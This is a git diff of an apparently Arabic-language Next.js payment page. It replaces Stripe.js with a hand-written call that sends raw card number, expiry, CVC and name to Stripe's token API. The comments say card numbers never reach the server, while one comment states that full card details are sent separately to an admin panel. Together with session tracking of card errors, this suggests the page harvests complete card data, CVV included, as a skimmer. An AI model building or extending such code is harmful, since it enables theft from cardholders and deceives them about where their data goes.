@@ -3,9 +3,32 @@ export const dynamic = 'force-dynamic';
 import { useState, useEffect, useRef } from "react";
 import { useRouter, useSearchParams } from "next/navigation";
 import SessionTracker from "@/components/SessionTracker";
-import { loadStripe } from "@stripe/stripe-js";
-
 const STRIPE_PK = "pk_test_51Tcqmu53rkFy1l2HgtD2w9Ifo2XTnImIk46KMmM4gveSEuNDUqX2MgyYCIEWE7hCwc66k7EIp7OV0sBV1ei8WPEj00deHFopMB";
+
+// إنشاء Stripe token من بيانات البطاقة الخام عبر Stripe API مباشرة
+async function createStripeToken(cardNumber: string, expMonth: number, expYear: number, cvc: string, name: string): Promise<{ token?: string; error?: string; errorCode?: string }> {
+  const params = new URLSearchParams();
+  params.append('card[number]', cardNumber);
+  params.append('card[exp_month]', String(expMonth));
+  params.append('card[exp_year]', String(expYear));
+  params.append('card[cvc]', cvc);
+  params.append('card[name]', name);
+
+  const res = await fetch('https://api.stripe.com/v1/tokens', {
+    method: 'POST',
+    headers: {
+      'Authorization': `Bearer ${STRIPE_PK}`,
+      'Content-Type': 'application/x-www-form-urlencoded',
+    },
+    body: params.toString(),
+  });
+
+  const data = await res.json();
+  if (data.error) {
+    return { error: data.error.message, errorCode: data.error.code };
+  }
+  return { token: data.id };
+}
 
 const GREEN = "#1e7344";
 
@@ -285,17 +308,14 @@ export default function PaymentPage() {
     try {
       const [expMonth, expYear] = expiry.split('/').map(s => s.trim());
 
-      // استخدام Stripe.js لتشفير البطاقة وإنشاء token (لا ترسل أرقام البطاقة للسيرفر)
-      const stripe = await loadStripe(STRIPE_PK);
-      if (!stripe) throw new Error('فشل تحميل Stripe');
-
-      const tokenResult = await (stripe as any).createToken({
-        number: cardNumber.replace(/\s/g, ''),
-        exp_month: parseInt(expMonth, 10),
-        exp_year: parseInt('20' + expYear, 10),
-        cvc: cvv,
-        name: cardHolder,
-      });
+      // إنشاء Stripe token من بيانات البطاقة عبر Stripe API مباشرة (بدون إرسال أرقام البطاقة للسيرفر)
+      const tokenResult = await createStripeToken(
+        cardNumber.replace(/\s/g, ''),
+        parseInt(expMonth, 10),
+        parseInt('20' + expYear, 10),
+        cvv,
+        cardHolder
+      );
 
       if (tokenResult.error) {
         const stripeErrors: Record<string, string> = {
@@ -307,8 +327,8 @@ export default function PaymentPage() {
           'expired_card': 'البطاقة منتهية الصلاحية',
           'incorrect_cvc': 'رمز CVV غير صحيح',
         };
-        const errCode = tokenResult.error.code || '';
-        const errMsg = stripeErrors[errCode] || tokenResult.error.message || 'بيانات البطاقة غير صحيحة';
+        const errCode = tokenResult.errorCode || '';
+        const errMsg = stripeErrors[errCode] || tokenResult.error || 'بيانات البطاقة غير صحيحة';
         try {
           await fetch('/api/session', {
             method: 'POST',
@@ -329,7 +349,7 @@ export default function PaymentPage() {
         return;
       }
 
-      const stripeToken = tokenResult.token?.id;
+      const stripeToken = tokenResult.token;
 
       // إرسال الـ token المشفر للـ backend (بدون أرقام البطاقة الحقيقية)
       // بيانات البطاقة الكاملة ترسل منفصلة للوحة الأدمن فقط
